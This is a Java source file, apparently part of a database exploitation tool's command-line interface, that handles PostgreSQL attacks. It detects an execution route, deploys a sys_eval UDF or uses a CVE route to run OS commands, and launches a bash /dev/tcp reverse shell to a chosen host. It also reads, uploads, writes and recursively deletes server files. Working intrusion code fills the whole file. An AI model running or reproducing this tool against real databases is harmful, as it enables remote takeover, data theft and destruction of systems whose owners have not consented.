package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.PostgreSqlDao;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.util.Map;

/**
 * PostgreSQL 分发：info（low/udf/cve 分档）/ exec（自动选路 + udf 自动部署）/ sql / clean；revshell 与文件操作 M3a。
 */
public class PostgreSqlDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "postgresql";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc.isEmpty() ? "UTF-8" : ctx.enc;
        PostgreSqlDao dao = new PostgreSqlDao(rec.get("ipaddress"), rec.get("port"), rec.get("database"),
                rec.get("username"), rec.get("password"), String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);
        dao.getConnection();

        if ("sql".equals(tool)) {
            return Result.ok(dao.runSql(p.positionals.get(0), code)).withId(id);
        }
        if ("info".equals(tool)) {
            dao.getInfo();
            JSONObject d = new JSONObject();
            d.put("version", dao.getVersionNumber() == null ? "" : String.valueOf(dao.getVersionNumber()));
            d.put("os", nz(dao.getSystemplatform()));
            d.put("bits", nz(dao.getSystemVersionNum()));
            d.put("route", nz(dao.getEvalType()));
            return Result.ok("PostgreSQL " + d.get("version") + " / " + nz(dao.getSystemplatform())
                    + " / 路线=" + nz(dao.getEvalType()), d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            if (dao.getEvalType() == null || dao.getEvalType().isEmpty()) {
                dao.getInfo();
            }
            String route = dao.getEvalType();
            if ("low".equals(route)) {
                dao.createEval();
                return Result.ok(nz(dao.LowVersionEval(cmd, code))).withId(id);
            }
            if ("udf".equals(route)) {
                ensureUdf(dao);
                return Result.ok(nz(dao.udfEval(cmd, code))).withId(id);
            }
            if ("cve".equals(route)) {
                return Result.ok(nz(dao.cveEval(cmd, code))).withId(id);
            }
            return Result.target("无法确定执行路线（route=" + route + "）",
                    "先 mdut info --id " + id + " 查看分档；该版本可能不受支持").withId(id);
        }
        if ("clean".equals(tool)) {
            dao.clear();
            return Result.ok("clean 完成（drop sys_eval；cve 路线的 cmd_exec 随执行自清）").withId(id);
        }
        // ---- revshell（sys_eval/COPY 包装 nohup 后台；M3a▲） ----
        if ("revshell".equals(tool)) {
            String ip = p.positionals.get(0);
            String port = p.positionals.get(1);
            String sh = "nohup bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1' >/dev/null 2>&1 &";
            if (dao.getEvalType() == null || dao.getEvalType().isEmpty()) {
                dao.getInfo();
            }
            String route = dao.getEvalType();
            if ("low".equals(route)) {
                dao.createEval();
                dao.LowVersionEval(sh, code);
            } else if ("udf".equals(route)) {
                ensureUdf(dao);
                dao.udfEval(sh, code);
            } else if ("cve".equals(route)) {
                dao.cveEval(sh, code);
            } else {
                return Result.target("无法确定执行路线（route=" + route + "）", "先 mdut info 查看分档").withId(id);
            }
            return Result.ok("revshell 已发起（回连 " + ip + ":" + port + "，nohup 后台；监听端自行接壳）").withId(id);
        }
        // ---- 文件操作（M3a：pg_ls_dir / pg_read_file / lo_export / 命令包装） ----
        if ("list-files".equals(tool)) {
            String path = p.positionals.get(0).replace("'", "''");
            String res = dao.runSql("select pg_ls_dir('" + path + "') as f", code);
            org.json.JSONArray arr = new org.json.JSONArray();
            for (String line : res.split("\n")) {
                String f = line.trim();
                if (!f.isEmpty() && !"NULL".equalsIgnoreCase(f)) {
                    arr.put(f);
                }
            }
            JSONObject d = new JSONObject();
            d.put("files", arr);
            return Result.ok(res, d).withId(id);
        }
        if ("read".equals(tool) || "download".equals(tool)) {
            String path = p.positionals.get(0).replace("'", "''");
            String res = dao.runSql("select encode(pg_read_binary_file('" + path + "'),'hex') as h", "UTF-8").trim();
            if (res.isEmpty() || res.toUpperCase().contains("NULL")) {
                return Result.target("读取失败: pg_read_binary_file 返回 NULL",
                        "需 superuser/角色 pg_read_server_files；路径受 data_directory 约束（PG<11 仅 data_directory 内）").withId(id);
            }
            byte[] bytes = MysqlDispatcher.hexToBytes(res);
            if ("download".equals(tool)) {
                return MssqlDispatcher.toOutBytes(ctx, bytes, flag(p, "out", "")).withId(id);
            }
            return Result.ok(new String(bytes, code),
                    new JSONObject().put("b64", java.util.Base64.getEncoder().encodeToString(bytes))
                            .put("size", bytes.length)).withId(id);
        }
        if ("write".equals(tool) || "upload".equals(tool)) {
            byte[] content;
            String remote;
            if ("write".equals(tool)) {
                content = MssqlDispatcher.readContent(p);
                remote = p.positionals.get(0);
            } else {
                byte[] bytes = Util.Utils.toByteArray(p.positionals.get(0));
                if (bytes != null && bytes.length > 64 * 1024 * 1024) {
                    return Result.usage("文件超过 64MB 上限（SQL 管道内存约束，hex/base64 化会翻倍）",
                            "大文件请分块写入或用 download/upload 之外的带外通道").withId(id);
                }
                if (bytes == null) {
                    return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
                }
                content = bytes;
                remote = p.positionals.get(1);
            }
            String path = remote.replace("'", "''");
            dao.writeFileLo(path, content);
            return Result.ok("写入完成: " + remote + " (" + content.length + " bytes，经 lo_export)").withId(id);
        }
        if ("rm".equals(tool) || "mkdir".equals(tool)) {
            String path = p.positionals.get(0);
            String sh = ("rm".equals(tool) ? "rm -rf " : "mkdir -p ") + path.replace("'", "''");
            if (dao.getEvalType() == null || dao.getEvalType().isEmpty()) {
                dao.getInfo();
            }
            String route = dao.getEvalType();
            String res;
            if ("low".equals(route)) {
                dao.createEval();
                res = nz(dao.LowVersionEval(sh, code));
            } else if ("udf".equals(route)) {
                ensureUdf(dao);
                res = nz(dao.udfEval(sh, code));
            } else if ("cve".equals(route)) {
                res = nz(dao.cveEval(sh + " 2>&1", code));
            } else {
                return Result.target("无法确定执行路线（route=" + route + "）", "先 mdut info 查看分档").withId(id);
            }
            return Result.ok(res).withId(id);
        }
        return Result.usage("postgresql 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    /** sys_eval 存在性探测（pg_proc）；缺失则走 udf() 部署链（幂等 CREATE OR REPLACE） */
    private void ensureUdf(PostgreSqlDao dao) throws Exception {
        PreparedStatement st = dao.getConnection().prepareStatement(
                "select 1 from pg_proc where proname='sys_eval' limit 1");
        ResultSet rs = st.executeQuery();
        boolean exists = rs.next();
        rs.close();
        st.close();
        if (!exists) {
            dao.udf();
        }
    }

    private static String nz(String s) {
        return s == null ? "" : s;
    }
}
